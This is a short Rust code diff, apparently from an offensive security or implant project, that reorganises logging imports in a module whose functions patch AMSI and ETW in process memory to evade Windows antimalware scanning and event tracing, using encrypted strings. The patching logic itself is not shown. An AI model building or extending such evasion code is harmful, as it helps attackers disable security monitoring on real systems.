@@ -1,13 +1,13 @@
 use std::ffi::c_void;
 
-#[cfg(debug_assertions)]
-use shared::pretty_print::print_info;
 use str_crypter::{decrypt_string, sc};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
 };
 
 use crate::utils::export_resolver::{self, ExportResolveError};
+use shared::pretty_print::print_failed;
+use shared::pretty_print::print_info;
 
 pub fn run_evasion() {
     //
@@ -28,11 +28,6 @@ pub fn run_evasion() {
 pub fn patch_amsi_if_ft_flag() {
     #[cfg(feature = "patch_amsi")]
     {
-        #[cfg(debug_assertions)]
-        use shared::pretty_print::print_failed;
-        #[cfg(debug_assertions)]
-        use shared::pretty_print::print_info;
-
         use crate::utils::export_resolver::resolve_address;
 
         print_info(sc!("Patching amsi..", 49).unwrap());
@@ -72,9 +67,6 @@ pub fn patch_amsi_if_ft_flag() {
 fn etw() {
     #[cfg(feature = "patch_etw")]
     {
-        #[cfg(debug_assertions)]
-        use shared::pretty_print::print_info;
-
         #[cfg(debug_assertions)]
         print_info("Patching etw..");
 
